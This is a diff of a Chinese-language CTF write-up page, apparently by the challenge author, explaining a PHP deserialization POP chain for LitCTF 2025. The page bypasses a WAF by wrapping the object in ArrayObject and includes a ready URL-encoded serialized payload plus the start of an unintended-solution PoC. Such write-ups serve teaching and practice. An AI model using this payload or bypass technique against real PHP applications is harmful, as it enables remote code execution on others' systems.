@@ -160,7 +160,7 @@ var_dump($a);
 </code></pre>
 <p>那么触发<code>__call($func,$args)</code>时<code>$func</code>就会被赋值为&quot;flag&quot;;<code>$args</code>就会被赋值为flag()的参数构成的数组。所以要给<code>$args</code>赋值需要在flag()的参数里传入。</p>
 <h3>bypass</h3>
-<p>waf是一个很简单的检测O开头，常规的将O直接改为C是不行的，因为链子涉及到了很多魔术方法，这里需要用一个类来对链子进行包装，然后开头的O就会被自动转换为C，具体请看2023愚人杯3rd[easy_php]</p>
+<p>waf是一个很简单的检测O开头，常规的将O直接改为C是不行的，因为POP链涉及到了很多魔术方法，这里需要用一个类来对POP链进行包装，然后开头的O就会被自动转换为C，具体请看2023愚人杯3rd[easy_php]</p>
 <p>可以使用的类有很多：</p>
 <ul>
 <li>ArrayObject::unserialize</li>
@@ -194,7 +194,7 @@ $a = new Taki();
 $b = new Mitsuha();
 $c = new KatawareDoki();
 
-$a-&gt;musubi = $b;		// 1.把对象当成函数调用，触发__invoke()
+$a-&gt;musubi = $b;		// 1. 把对象当成函数调用，触发__invoke()
 $b-&gt;thread = $c;		// 2. 把对象作为字符串使用，触发__toString()
 $c-&gt;soul = $a;			// 3. 调用不存在的方法，触发__call()
 
@@ -204,9 +204,10 @@ echo urlencode(serialize($d));
 </code></pre>
 <pre><code class="language-bash">Litctf2025=C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D
 </code></pre>
+<br>
 <h3>非预期</h3>
 <p>比赛开始了才发现有非预期，受不了了&gt;_&lt;</p>
-<p>直接在<code>return ($this-&gt;musubi)();</code>处调用匿名函数，抱歉出题疏忽惹，不过能发现这个的师傅真的很强👍。这里也贴上poc：</p>
+<p>直接在<code>return ($this-&gt;musubi)();</code>处调用匿名函数即可。抱歉出题疏忽惹，不过能发现这个的师傅真的很强👍。这里也贴上poc：</p>
 <pre><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 error_reporting(0);
